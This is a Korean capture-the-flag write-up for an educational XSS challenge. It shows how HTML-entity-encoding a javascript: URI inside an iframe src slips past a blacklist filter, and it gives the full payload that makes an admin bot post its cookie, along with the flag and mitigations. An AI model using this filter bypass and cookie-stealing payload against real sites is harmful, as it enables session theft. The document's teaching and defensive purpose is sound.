# [client] XSS #2 — 필터 우회 라이트업

- 대상: `arang-edu-challs-collection` / `challenges/client/xss-2`
- 카테고리: client
- 버그클래스: Cross-Site Scripting (filter bypass)
- 포트: 9102 (스코어보드: 9000)

## 취약점 분석

`challenges/client/xss-2/app.py`는 아래와 같은 블랙리스트 필터를 게시글 본문에 적용한다.

```python
def content_filter(c):
    c = c.lower()
    vulns = ["javascript", "script", "on", "data", "base", "(", ")", "'"]
    vulns += [chr(x) for x in range(0x20)]
    return any(v in c for v in vulns)
```

소문자 변환 후 서브스트링 검사이므로 아래가 전부 막힌다.

- `<script>` 태그 자체 (`"script"` 포함)
- 모든 `on*` 이벤트 핸들러 — `onerror`, `onload`, `onclick` 등 전부 `"on"`을 포함하므로 전멸
- 괄호를 쓰는 함수 호출 전체 (`"("`, `")"` 자체 금지)
- 작은따옴표 문자열 리터럴
- `javascript:` / `data:` 스킴, `<base>` 관련 트릭
- 제어문자(0x00~0x1F) — 탭/개행을 이용한 흔한 우회도 차단

`location`, `function` 같은 흔한 식별자도 `"on"`을 포함해 그대로 못 쓴다(`locati**on**`, `functi**on**`).

`render_safe=True`는 xss-1과 동일하게 본문을 이스케이프 없이 출력하므로, 필터만 우회하면 임의 HTML을 삽입할 수 있다.

### 우회 아이디어

`<iframe src="...">` 는 태그·속성 이름 자체에 금지어가 없다. HTML 파서는 **속성 값**에 대해서는 문자 참조(HTML 엔티티)를 디코딩하지만, **태그/속성 이름**은 디코딩하지 않는다. 따라서:

- 이벤트 핸들러 방식(`onerror=...`)은 속성 *이름*이 `"on"`을 포함해야 하므로 엔티티로 숨길 수 없음 → 사용 불가
- 반면 `src` 속성 *값* 안에 `javascript:...` URI 전체(스킴 + 코드)를 HTML 숫자 엔티티(`&#106;&#97;&#118;...`)로 인코딩하면, 서버가 검사하는 **원문 문자열에는 금지어가 전혀 없지만**, 브라우저가 속성 값을 디코딩하는 순간 정상적인 `javascript:` URI로 복원되어 iframe 로드 시 자동 실행된다
- 괄호·따옴표도 전부 엔티티로 감춰지므로 `fetch(...)` 같은 함수 호출도 그대로 사용 가능

즉, "HTML 파서의 엔티티 디코딩 시점(속성 값에서만 일어남)과 서버 필터의 검사 시점(디코딩 이전 원문) 사이의 간극"을 이용한 우회다.

## 익스플로잇

xss-1과 동일하게, `flag_in_cookie=True`이고 `HttpOnly` 미설정이라 admin 쿠키를 훔치면 flag를 얻는다. 외부 리스너 없이, admin 봇이 같은 오리진의 `/write`에 `fetch` POST를 하도록 만들어 admin 명의로 `document.cookie`를 담은 글을 대신 쓰게 하는 방식을 재사용한다(`_base/flask_board/core.py`의 `last_reporter` 귀속 로직).

### 페이로드 생성 (Python)

```python
def enc(s):
    return "".join(f"&#{ord(ch)};" for ch in s)

target = ("javascript:fetch('/write',{method:'POST',"
          "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
          "body:'subject=leak&content='+encodeURIComponent(document.cookie)})")
payload = f'<iframe src="{enc(target)}"></iframe>'
```

디코딩하면 다음과 같다.

```
javascript:fetch('/write',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'subject=leak&content='+encodeURIComponent(document.cookie)})
```

### 실제 사용한 페이로드 (본문/content 필드에 삽입)

```html
<iframe src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#102;&#101;&#116;&#99;&#104;&#40;&#39;&#47;&#119;&#114;&#105;&#116;&#101;&#39;&#44;&#123;&#109;&#101;&#116;&#104;&#111;&#100;&#58;&#39;&#80;&#79;&#83;&#84;&#39;&#44;&#104;&#101;&#97;&#100;&#101;&#114;&#115;&#58;&#123;&#39;&#67;&#111;&#110;&#116;&#101;&#110;&#116;&#45;&#84;&#121;&#112;&#101;&#39;&#58;&#39;&#97;&#112;&#112;&#108;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#47;&#120;&#45;&#119;&#119;&#119;&#45;&#102;&#111;&#114;&#109;&#45;&#117;&#114;&#108;&#101;&#110;&#99;&#111;&#100;&#101;&#100;&#39;&#125;&#44;&#98;&#111;&#100;&#121;&#58;&#39;&#115;&#117;&#98;&#106;&#101;&#99;&#116;&#61;&#108;&#101;&#97;&#107;&#38;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#61;&#39;&#43;&#101;&#110;&#99;&#111;&#100;&#101;&#85;&#82;&#73;&#67;&#111;&#109;&#112;&#111;&#110;&#101;&#110;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;&#125;&#41;"></iframe>
```

> 주의: 이 페이로드는 반드시 글쓰기 화면의 **본문(content)** 필드에 넣어야 한다. 제목(subject)에 넣으면 `board.html`이 subject를 escape 출력(`{{ a.subject }}`, `|safe` 없음)하므로 절대 실행되지 않는다. (실제 시도 중 이 실수로 한 번 실패했다.)

## 진행 절차 (실제 성공 경로)

1. 글쓰기 → 제목: `test`, 본문: 위 iframe 페이로드 → 저장 (필터에 막히지 않음)
2. 저장된 글 번호 확인 (예: `http://localhost:9102/board/1261`)
3. `/report` → `http://xss-2:9102/board/1261` 제출 (host는 서비스명 `xss-2`)
4. 10~15초 대기 (봇이 admin 로그인 후 방문, iframe이 로드되며 `javascript:` URI 실행 → `/write`로 `document.cookie` 전송)
5. 내 `/board`에서 admin이 쓴 `leak` 글 확인 → 본문에서 flag 확인

## 플래그

```
flag{eb4d89f583b5d6e5943c}
```

## 대응방안

- 블랙리스트 대신 화이트리스트 기반 태그/속성 허용 목록 사용, 또는 검증된 HTML sanitizer 라이브러리(bleach 등) 사용
- 필터링을 원문 문자열 매칭이 아니라 파싱된 DOM/토큰 기준으로 수행(HTML 파서가 엔티티를 디코딩하는 지점 이후에 검사)
- `iframe`, `object`, `embed` 등 위험 태그 자체를 화이트리스트에서 제외
- 출력 시 컨텍스트에 맞는 escape 적용, `|safe` 사용 금지
- 민감 쿠키는 `HttpOnly`, CSP로 인라인/이벤트 핸들러 스크립트 실행 및 `javascript:` 내비게이션 차단(`script-src`, `frame-src`)
